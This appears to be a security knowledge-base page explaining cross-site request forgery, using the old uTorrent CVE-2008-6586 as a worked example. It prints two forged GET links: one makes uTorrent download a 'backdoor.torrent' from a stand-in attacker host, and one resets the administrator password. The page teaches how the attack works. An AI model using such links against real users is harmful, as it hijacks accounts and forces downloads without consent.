---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Cross-Site Request Forgery

**Cross-site request forgery (CSRF)**, also known as one-click attack or session riding, is a type of exploit of websites and web applications where **unauthorized commands are submitted from a user that the web application trusts**.

There are many ways in which a malicious website can transmit such commands. The following methods can even work without the user's interaction or even knowledge:

* Specially-crafted image tags
* Hidden forms
* JavaScript fetch
* XMLHttpRequests

Unlike XSS, which exploits the trust a user has for a particular site, **CSRF exploits the trust that a site has in a user's browser**.

In a CSRF attack, an innocent end user is tricked by an attacker into submitting a web request that they did not intend. This may cause actions to be performed on the website that can include:

* Inadvertent client or server data leakage
* Change of session state
* Manipulation of an end user's account

**CSRF attacks target functionality that causes a state change on the server**, such as changing the victim’s email address or password, or purchasing something. Forcing the victim to retrieve data doesn’t benefit an attacker because the attacker doesn’t receive the response, the victim does. As such, CSRF attacks target state-changing requests.

## Example

Attackers who can find a reproducible link that executes a specific action on the target page while the victim is logged in can embed such link on a page they control and trick the victim into opening it.

The attack carrier link may be placed in a location that the victim is likely to visit while logged into the target site (for example, a discussion forum), or sent in an HTML email body or attachment.

### uTorrent

[CVE-2008-6586](https://nvd.nist.gov/vuln/detail/CVE-2008-6586) was a CSRF vulnerability in uTorrent that exploited the fact that its web console accessible at `localhost:8080` allowed critical actions to be executed using a simple GET request.

For example a forcing a torrent download could be achieved with the following link:

```
http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent
```

Changing the uTorrent administrator user's password could be achieved in a similar fashion:

```
http://localhost:8080/gui/?action=setsetting&s=webui.password&v=eviladmin
```

&#x20;Attacks were launched by placing malicious, automatic-action HTML image elements on forums and email spam, so that browsers visiting these pages would open them automatically, without much user action. People running vulnerable uTorrent version at the same time as opening these pages were susceptible to the attack.

In the uTorrent example described above, the attack was facilitated by the fact that uTorrent's web interface used `GET` request for critical state-changing operations (change credentials, download a file etc.), which [RFC 2616](https://datatracker.ietf.org/doc/html/rfc2616) explicitly discourages.
